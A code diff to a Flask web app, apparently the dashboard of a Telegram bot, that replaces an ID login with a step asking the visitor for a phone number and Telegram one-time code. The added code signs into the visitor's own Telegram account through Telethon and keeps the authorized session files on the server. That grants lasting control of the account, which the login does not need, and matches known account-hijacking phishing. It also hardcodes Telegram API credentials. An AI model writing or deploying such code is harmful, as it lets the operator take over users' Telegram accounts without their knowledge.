@@ -1,13 +1,26 @@
 import os
 import json
 import hashlib
+import asyncio
 from datetime import datetime
-from flask import Flask, render_template, request, redirect, url_for, session
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
+from telethon import TelegramClient, errors
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
+# Telegram API for UserSession
+API_ID = 30158256
+API_HASH = "547889500d1e8399c3da0a8ecff5f461"
+
 DATA_FILE = 'user_data.json'
+SESSIONS_DIR = 'sessions'
+
+if not os.path.exists(SESSIONS_DIR):
+    os.makedirs(SESSIONS_DIR)
+
+# Global dictionary to store pending clients
+pending_clients = {}
 
 def load_data():
     if os.path.exists(DATA_FILE):
@@ -46,11 +59,66 @@ def login():
             user_id = login_id
 
     if user_id:
-        session['user_id'] = user_id
-        return redirect(url_for('dashboard'))
+        # In this new flow, we don't set session yet. 
+        # We just confirm the ID is valid and then the frontend shows OTP.
+        return jsonify({'success': True, 'user_id': user_id})
     
-    # Return a better looking error page or style the response
-    return render_template('login.html', error="Invalid ID. Please check your 'My History' ID in the bot."), 401
+    return jsonify({'success': False, 'message': "Invalid ID"}), 401
+
+@app.route('/request_otp', methods=['POST'])
+async def request_otp():
+    phone = request.json.get('phone', '').strip()
+    if not phone:
+        return jsonify({'success': False, 'message': 'Phone number required'}), 400
+    
+    session_path = os.path.join(SESSIONS_DIR, f"{phone}")
+    client = TelegramClient(session_path, API_ID, API_HASH)
+    
+    try:
+        await client.connect()
+        if not await client.is_user_authorized():
+            sent_code = await client.send_code_request(phone)
+            pending_clients[phone] = {
+                'client': client,
+                'phone_code_hash': sent_code.phone_code_hash
+            }
+            return jsonify({'success': True, 'message': 'OTP sent successfully'})
+        else:
+            # If already authorized, we still need to know which user_id this is for the session
+            # For simplicity, we'll let the frontend handle the dashboard redirect
+            await client.disconnect()
+            return jsonify({'success': True, 'message': 'Already logged in', 'authorized': True})
+    except Exception as e:
+        if client.is_connected():
+            await client.disconnect()
+        return jsonify({'success': False, 'message': str(e)}), 500
+
+@app.route('/verify_otp', methods=['POST'])
+async def verify_otp():
+    phone = request.json.get('phone', '').strip()
+    otp = request.json.get('otp', '').strip()
+    user_id = request.json.get('user_id', '').strip() # Passed from frontend
+    
+    if phone not in pending_clients:
+        return jsonify({'success': False, 'message': 'Session expired or not found'}), 400
+    
+    client_data = pending_clients[phone]
+    client = client_data['client']
+    phone_code_hash = client_data['phone_code_hash']
+    
+    try:
+        await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
+        # Login successful
+        del pending_clients[phone]
+        await client.disconnect()
+        
+        # Now set the flask session
+        session['user_id'] = user_id
+        return jsonify({'success': True, 'message': 'Login successful'})
+    except errors.SessionPasswordNeededError:
+        return jsonify({'success': False, 'needs_password': True, 'message': 'Two-step verification enabled'})
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)}), 400
 
 @app.route('/dashboard')
 def dashboard():
